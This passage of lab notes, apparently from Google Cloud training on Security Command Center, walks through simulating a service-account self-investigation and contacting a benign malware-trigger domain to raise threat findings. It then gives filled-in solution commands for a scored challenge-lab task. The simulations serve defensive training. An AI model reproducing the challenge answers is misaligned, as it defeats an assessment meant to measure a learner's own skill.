Finding.</span></p></li><li><p><span>Ensure that the display name is set to </span><code>Event Threat Detection</code><span>—this is the SCC service that detected a misconfiguration in your Google Cloud Project.</span></p></li><li><p><span>Scroll to the top of the window and select the </span><strong><span>Source Properties</span></strong><span> tab.</span></p></li><li><p><span>In this tab, expand the </span><strong><span>Properties &gt; sensitiveRoleGrant</span></strong><span> field.</span></p></li><li><p><span>Here you can find the most important characteristics of this finding:</span></p></li></ol><ul><li><p><strong><span>principalEmail:</span></strong><span> who performed the suspicious action</span></p></li><li><p><strong><span>bindingDetails:</span></strong><span> information about the role and the member to whom this role has been granted</span></p></li><li><p><strong><span>members:</span></strong><span> to whom the permission has been granted</span></p></li></ul><ol start='' ><li><p><span>Close the Finding window.</span></p></li><li><p><span>From the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), select </span><strong><span>IAM &amp; Admin &gt; IAM</span></strong><span>.</span></p></li><li><p><span>Select the checkbox next to the </span><code>demouser1@gmail.com</code><span> principal and click the button </span><strong><span>Remove Access</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Confirm</span></strong><span>.</span></p></li><li><p><span>Open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) and select </span><strong><span>Security &gt; Security Command Center &gt; Findings</span></strong><span>.</span></p></li></ol><p><span>Note that the &quot;Non org IAM member&quot; finding has disappeared from the list of findings. This is because the Security Health Analytics service has checked the updated configuration of IAM policies and deactivated this Finding.</span></p><p><strong><span>Note:</span></strong><span> If you still see this Finding in the list, please refresh the browser tab.</span></p><p><span>The Finding &quot;Persistence: IAM anomalous grant&quot; has not changed its status. It was initiated by the ETD service, and cannot be deactivated automatically. You have already investigated this Finding and can be sure that the user from the gmail.com domain does not have access to your project.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Initiate and mitigate a threat with Event Threat Detection</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> If you are receiving less than 20 points for this task, in the &quot;Checkpoints&quot; right-hand column, click the </span><strong><span>Check my progress</span></strong><span> button a couple of times.</span></p><h2 id='task-2-configure-a-cloud-environment-to-detect-threats'><span>Task 2. Configure a cloud environment to detect threats</span></h2><p><span>Now that you&#39;ve investigated and checked for non-compliant accounts, you need to configure Cymbal&#39;s environment to detect service account threats through logging.</span></p><p><img src="images\um2UhA%2B1%2F3jv2znF0TeprxbvqLtN8h8EeQ%2FvEib16io%3D" referrerpolicy="no-referrer" alt="fd5c653fce1f1a4.png"></p><p>&nbsp;</p><p><span>Many logs in Google Cloud are enabled by default, but for detecting specific threats, you need to enable additional data access logs. In this exercise, you investigate the </span><a href='https://cloud.google.com/security-command-center/docs/how-to-investigate-threats#service_account_self-investigation'><span>Service Account Self-Investigation</span></a><span> threat.</span></p><p><span>In this scenario, a malicious actor exploits vulnerable software on a virtual machine and obtains access to the Default Service Account (which was used to create the instance). The actor wants to understand what they can do in the Google Cloud environment. To check their permissions, the actor calls the </span><a href='https://cloud.google.com/resource-manager/reference/rest/v3/projects/getIamPolicy'><span>projects.getIamPolicy method</span></a><span>. SCC should detect and report this suspicious activity recorded in the logs.</span></p><p><span>For SCC to detect this activity, you need to enable Resource Manager Admin Read logs.</span></p><ol start='' ><li><p><span>In the Cloud console, open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) and select </span><strong><span>IAM &amp; Admin &gt; Audit Logs.</span></strong></p></li></ol><p><strong><span>Note:</span></strong><span> You can safely ignore the message: &quot;You don&#39;t have permission to view inherited audit logs configuration data for one or more parent resources.&quot;</span></p><ol start='' ><li><p><span>In the list of services, find </span><strong><span>Cloud Resource Manager API</span></strong><span> and select the checkbox associated with it.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If you cannot find it, scroll down to the parameter &quot;Rows per page&quot; and set its value to 200.</span></p><ol start='' ><li><p><span>On the right side of the tab, find the configuration frame: </span><strong><span>Cloud Resource Manager API - Permission Types</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>Admin Read</span></strong><span> checkbox and click </span><strong><span>Save.</span></strong></p></li></ol><p><span>Now Resource Manager Data Read audit logs are collected and Event Threat Detection can analyze them.</span></p><h3 id='create-a-virtual-machine-with-default-service-account-access'><span>Create a virtual machine with default service account access</span></h3><p><span>For reproducing the scenario, you need to create a new virtual machine with a default Service Account and </span><code>cloud-platform</code><span> access scope.</span></p><ol start='' ><li><p><span>Open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) and select </span><strong><span>Compute Engine &gt; VM instances</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Create Instance</span></strong><span> button.</span></p></li><li><p><span>In the </span><strong><span>Machine configuration</span></strong><span>:</span></p><ul><li><p><span>Select region as </span><strong><code>europe-west1</code></strong><span> and set zone as </span><strong><code>europe-west1-b</code></strong><span>.</span></p></li></ul></li><li><p><span>Click </span><strong><span>Security</span></strong><span>.</span></p><ul><li><p><span>In the </span><strong><span>Access scopes</span></strong><span> section, select the </span><strong><span>Allow full access to all Cloud APIs</span></strong><span> value.</span></p></li></ul></li><li><p><span>Leave all other parameters set to their default value.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span> to launch the new VM instance.</span></p></li><li><p><span>Once the instance is created, click on the </span><strong><span>SSH</span></strong><span> button.</span></p></li><li><p><span>Accept the authorization prompts when the new SSH window opens.</span></p></li><li><p><span>In the SSH session, enter the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud projects get-iam-policy $(gcloud config get project)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see the list of IAM permissions granted to users in the Google Cloud project.</span></p><ol start='' ><li><p><span>Open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) and select </span><strong><span>Security &gt; Security Command Center &gt; Findings.</span></strong></p></li><li><p><span>Set the value of the time range selector to </span><strong><span>Last hour</span></strong><span>.</span></p></li></ol><p><span>You should see </span><strong><span>5</span></strong><span> Security Findings related to the instance you just created:</span></p><ul><li><p><em><span>Discovery: Service Account Self-Investigation</span></em></p></li><li><p><em><span>Full API access</span></em></p></li><li><p><em><span>Default service account used</span></em></p></li><li><p><em><span>Compute secure boot disabled</span></em></p></li><li><p><em><span>Public IP address</span></em></p></li></ul><p><span>The Finding &quot;Discovery: Service Account Self-Investigation&quot; was initiated by Event Threat Detection (ETD), which classifies findings with the </span><em><span>THREAT</span></em><span> Finding Class.</span></p><p><span>Other findings have been initiated by the Security Health Analytics component, which classifies Findings by </span><em><span>MISCONFIGURATION</span></em><span>.</span></p><ol start='' ><li><p><span>Click on the Finding, </span><strong><span>Discovery: service account self-investigation</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>Source Properties</span></strong><span> tab at the top of the window.</span></p></li><li><p><span>Now expand the field </span><strong><span>properties &gt; serviceAccountGetsOwnIamPolicy</span></strong><span>.</span></p></li><li><p><span>Inspect the following values:</span></p></li></ol><ul><li><p><strong><span>principalEmail</span></strong><span> - the email address of the Service Account that is investigating its own permissions</span></p></li><li><p><strong><span>callerIp</span></strong><span> - IP address from which the </span><code>projects.getIamPolicy</code><span> method was called. In our case it should be the external IP address of the virtual machine </span><code>instance-1</code><span>.</span></p></li></ul><ol start='' ><li><p><span>Exit out of the Finding window.</span></p></li></ol><p><span>Outside of this scenario, this Finding can inform you that your virtual machine and the default Service Account have been compromised and you need to investigate and contain this incident.</span></p><h3 id='mute-the-finding-youve-investigated'><span>Mute the finding you&#39;ve investigated</span></h3><p><span>Now that you&#39;ve investigated the finding, mute it.</span></p><ol start='' ><li><p><span>Select the checkbox next to the </span><strong><span>Discovery: Service Account Self-Investigation</span></strong><span> Finding.</span></p></li><li><p><span>Expand the </span><strong><span>Mute options</span></strong><span> drop-down list.</span></p></li><li><p><span>Then select the </span><strong><span>Apply mute override</span></strong><span> option.</span></p></li><li><p><span>Ensure that this Finding no longer appears in the SCC interface.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Configure a cloud environment to detect threats</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-3-manage-scc-findings-with-event-threat-detection'><span>Task 3. Manage SCC findings with Event Threat Detection</span></h2><p><span>When detecting some threats you may need to enable additional logs, which are not enabled by default. For detecting some findings, you also need to create additional configurations, such as DNS policies.</span></p><p><span>This allows you to detect malicious software running on compute resources and to identify well-known malicious DNS addresses.</span></p><p><span>When a DNS request is made on a virtual machine, this query is not logged by default, and in turn SCC cannot detect connections to malicious internet resources.</span></p><p><span>In the previous task, you enabled logs for the Resource Manager service using an IAM configuration. For logging all DNS queries, you need to create a DNS policy with logging enabled.</span></p><p><strong><span>Note:</span></strong><span> You can refer to the </span><a href='https://cloud.google.com/dns/docs/monitoring'><span>Use logging and monitoring</span></a><span> reference guide to learn more about logging and monitoring metrics for Cloud DNS.</span></p><ol start='' ><li><p><span>To enable full DNS query logging, open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), scroll down, click </span><strong><span>View All Products</span></strong><span>, and select </span><strong><span>Network services &gt; Cloud DNS.</span></strong></p></li><li><p><span>Click the </span><strong><span>DNS Server Policies</span></strong><span> tab and click the </span><strong><span>Create Policy</span></strong><span> button.</span></p></li><li><p><span>Enter </span><code>dns-test-policy</code><span> for the name of the DNS policy.</span></p></li><li><p><span>Select the </span><strong><span>On</span></strong><span> radio button for DNS logs.</span></p></li><li><p><span>In the &quot;Alternate DNS servers&quot; part, select </span><strong><span>default</span></strong><span> from the network dropdown and click </span><strong><span>OK</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Create</span></strong><span> button.</span></p></li><li><p><span>Now return to the SSH session of your virtual machine and try connecting to the malicious URL by running the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl etd-malware-trigger.goog</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should receive output similar to the following.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;!DOCTYPE html&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;html lang="en-us"&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;meta charset="utf-8"&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;title&gt;ETD Malware Trigger&lt;/title&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;p&gt;This domain is used to trigger a malware finding in Google Event Threat Detection. For more information, please visit &lt;a href="https://cloud.google.com/event-threat-detection"&gt;https://cloud.google.com/event-threat-detection&lt;/a&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><ol start='' ><li><p><span>Return to the Google Cloud console browser tab.</span></p></li><li><p><span>Open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) and select </span><strong><span>Security &gt; Security Command Center &gt; Findings</span></strong><span>.</span></p></li><li><p><span>You should now see a new threat appear, &quot;Malware: Bad Domain&quot;.</span></p></li></ol><p><strong><span>Note:</span></strong><span> If you don&#39;t see the new threat, refresh your browser window.</span></p><ol start='' ><li><p><span>Click on this Finding.</span></p></li><li><p><span>In the new window, click on the </span><strong><span>Source properties</span></strong><span> tab.</span></p></li><li><p><span>Expand the </span><strong><span>Properties</span></strong><span> field and examine the following:</span></p></li></ol><ul><li><p><strong><span>Domains:</span></strong><span> the list of domains for which the instance requested address resolution</span></p></li><li><p><strong><span>InstanceDetails:</span></strong><span> the ID of the instance that connected to the &quot;malicious&quot; domain</span></p></li></ul><ol start='' ><li><p><span>Close the Finding Window.</span></p></li><li><p><span>Select the checkbox associated with the Finding, </span><strong><span>Malware: Bad Domain</span></strong><span>.</span></p></li><li><p><span>Expand the </span><strong><span>Mute Options</span></strong><span> drop-down list.</span></p></li><li><p><span>Click </span><strong><span>Apply mute override</span></strong><span>. This Finding is now removed from the SCC interface.</span></p></li><li><p><span>From the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), select </span><strong><span>Compute Engine &gt; VM instances.</span></strong></p></li><li><p><span>Select the checkbox next to the virtual machine instance you created previously and click </span><strong><span>Delete.</span></strong></p></li><li><p><span>Confirm the delete action and click </span><strong><span>Delete</span></strong><span>.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Manage SCC findings with Event Threat Detection</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='congratulations-41'><span>Congratulations!</span></h2><p><span>In this lab, you learned how to initiate and mitigate a threat with Event Threat Detection, configure a cloud environment to detect threats, and manage SCC findings with Event Threat Detection.</span></p><h2 id='lab---mitigate-threats-and-vulnerabilities-with-security-command-center-challenge-lab'><span>LAB - Mitigate Threats and Vulnerabilities with Security Command Center: Challenge Lab</span></h2><p>&nbsp;</p><h2 id='overview-44'><span>Overview</span></h2><p><span>In a challenge lab you’re given a scenario and a set of tasks. Instead of following step-by-step instructions, you will use the skills learned from the labs in the course to figure out how to complete the tasks on your own! An automated scoring system (shown on this page) will provide feedback on whether you have completed your tasks correctly.</span></p><p><span>When you take a challenge lab, you will not be taught new Google Cloud concepts. You are expected to extend your learned skills, like changing default values and reading and researching error messages to fix your own mistakes.</span></p><p><span>To score 100% you must successfully complete all tasks within the time period!</span></p><p><span>This lab is recommended for students who have enrolled in the </span><a href='https://www.cloudskillsboost.google/course_templates/759'><span>Mitigate Threats and Vulnerabilities with Security Command Center</span></a><span> skill badge. Are you ready for the challenge?</span></p><h3 id='topics-tested-2'><span>Topics tested</span></h3><ul><li><p><span>Create mute rules for Cymbal Bank</span></p></li><li><p><span>Analyze and fix Cymbal Bank&#39;s high vulnerability findings</span></p></li><li><p><span>Identify application vulnerabilities with SCC&#39;s security scanning features</span></p></li><li><p><span>Export Cymbal Bank Findings to a Google Cloud Storage Bucket</span></p></li></ul><h2 id='setup-and-requirements-39'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-27'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h2 id='challenge-scenario-4'><span>Challenge scenario</span></h2><p><img src="https://cdn.qwiklabs.com/vD5d2kq0fYY215r0BLo9RmTh4zTLR4MhcoSR6uueqtU%3D" referrerpolicy="no-referrer" alt="5ce916afc496a60c.jpeg"></p><p>&nbsp;</p><p><span>Cymbal Bank is an American retail bank with over 2,000 branches in all 50 states. It offers comprehensive debit and credit services that are built on top of a robust payments platform. Cymbal Bank is a digitally transforming legacy financial services institution.</span></p><p><span>Cymbal Bank was founded in 1920 under the name Troxler. Cymbal Group acquired the company in 1975 after it had been investing heavily in Cymbal Group&#39;s proprietary ATMs. As the bank grew into a national leader, they put strategic emphasis on modernizing the customer experience both in-person at their branches and digitally through an app they released in 2014. Cymbal Bank employs 42,000 people nationwide and, in 2019, reported $24 billion in revenue.</span></p><p><span>In this challenge, you are a cloud security engineer tasked with securing Cymbal Bank&#39;s Google Cloud environment by leveraging Security Command Center&#39;s features. You have performed these tasks in previous labs. Now, it&#39;s your turn to demonstrate your proficiency with Security Command Center by implementing advanced threat detection and mitigation strategies, optimizing access controls, and ensuring compliance with industry regulations and best practices.</span></p><h2 id='task-1-configure-the-environment'><span>Task 1. Configure the environment</span></h2><p><span>First, make some baseline configurations to Cymbal Bank&#39;s environment, so you can implement robust security controls with Security Command Center.</span></p><ol start='' ><li><p><span>Open the navigation menu and select </span><strong><span>Security &gt; Security Command Center &gt; Findings</span></strong><span>.</span></p></li><li><p><span>From the time range selector, select </span><strong><span>Last 180 days</span></strong><span>. Your output should be similar to the following:</span></p></li></ol><p><img src="images/zKNta9nXyA0rXFYoEcMXj0X1ixXQ0LF8DJLgUyx8u7k%3D.png" referrerpolicy="no-referrer" alt="Active vulnerabilities graph over 180 days"></p><p><strong><span>Warning:</span></strong><span> For all SCC interfaces you interact in this challenge lab, ensure that the time range selected is always set to 180 days! If you don&#39;t configure this properly, you may not be able to identify or verify any of the requirements for a task.</span></p><h2 id='task-2-create-mute-rules-for-cymbal-bank'><span>Task 2. Create mute rules for Cymbal Bank</span></h2><p><span>Cymbal Bank is not interested in surfacing findings against certain resources in their Google Cloud environment.</span></p><ol start='' ><li><p><span>For this task, create three mute rules that address the following:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><strong><span>Name</span></strong></th><th style='text-align:left;' ><strong><span>Finding</span></strong></th><th style='text-align:left;' ><strong><span>Description</span></strong></th></tr></thead><tbody><tr><td style='text-align:left;' ><code>muting-flow-log-findings</code></td><td style='text-align:left;' ><span>Flow logs disabled</span></td><td style='text-align:left;' ><span>Rule for muting VPC Flow Logs</span></td></tr><tr><td style='text-align:left;' ><code>muting-audit-logging-findings</code></td><td style='text-align:left;' ><span>Audit logging disabled</span></td><td style='text-align:left;' ><span>Rule for muting audit logs</span></td></tr><tr><td style='text-align:left;' ><code>muting-admin-sa-findings</code></td><td style='text-align:left;' ><span>Admin service account</span></td><td style='text-align:left;' ><span>Rule for muting admin service account findings</span></td></tr></tbody></table></figure><p><strong><span>Warning:</span></strong><span> Ensure that the time range selected is always set to 180 days! If you don&#39;t configure this properly, you may not be able to identify or verify any of the requirements for a task.</span></p><p><strong><span>Note:</span></strong><span> You can find what to place in your Finding Query by exploring the Finding&#39;s details in SCC.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud scc muteconfigs create muting-flow-log-findings \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --project=$DEVSHELL_PROJECT_ID \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --location=global \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --description="Rule for muting VPC Flow Logs" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --filter="category=\"FLOW_LOGS_DISABLED\"" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --type=STATIC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud scc muteconfigs create muting-audit-logging-findings \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --project=$DEVSHELL_PROJECT_ID \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --location=global \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --description="Rule for muting audit logs" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --filter="category=\"AUDIT_LOGGING_DISABLED\"" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --type=STATIC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud scc muteconfigs create muting-admin-sa-findings \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --project=$DEVSHELL_PROJECT_ID \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --location=global \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --description="Rule for muting admin service account findings" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --filter="category=\"ADMIN_SERVICE_ACCOUNT\"" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  --type=STATIC</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 450px;"></div><div class="CodeMirror-gutters" style="display: none; height: 450px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Assessment Completed!</span></p><p><span>Create mute rules for Cymbal Bank</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p><em><span>Assessment Completed!</span></em></p><p>&nbsp;</p><h2 id='task-3-analyze-and-fix-cymbal-banks-high-vulnerability-findings'><span>Task 3. Analyze and fix Cymbal Bank&#39;s high vulnerability findings</span></h2><p><span>Cymbal Bank wants to remove two high severity Findings in their Google Cloud environment. You are tasked with using SCC to identify and follow the steps laid out to fix the following high severity Findings so they are no longer vulnerable:</span></p><ul><li><p><span>Open SSH port</span></p></li><li><p><span>Open RDP port</span></p></li></ul><p><span>Ensure that these rules are not facing the public internet. You can use the IP address </span><code>35.235.240.0/20</code><span> as a replacement for the ones facing the public internet.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div 